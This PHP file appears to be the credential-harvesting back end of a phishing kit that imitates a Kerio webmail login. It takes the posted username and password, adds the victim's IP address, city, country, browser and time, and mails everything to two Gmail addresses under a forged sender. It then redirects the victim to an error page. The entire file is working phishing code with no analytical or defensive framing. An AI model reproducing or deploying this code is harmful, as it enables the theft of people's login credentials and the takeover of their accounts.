<?php
$oslo=rand(); 
$praga=md5($oslo);

require_once('mail.php'); 
require_once('sync.php');

$login = $_POST['kerio_u'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "username: ".$_POST['kerio_u']."\n";
$message .= "Password: ".$_POST['kerio_p']."\n";
$message .= "============= [ Loc Info ] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'RMG';
$subj = "New EN | $login";
$from = "From: $domain<west@xsender.com>\n";
mail("yo6goal@gmail.com,sundbakkeen@gmail.com",$subj,$message,$from,$domain);

header("Location: error.php?websrc=$praga&dispatched=$oslo&id=$oslo$praga&email=$login");
?>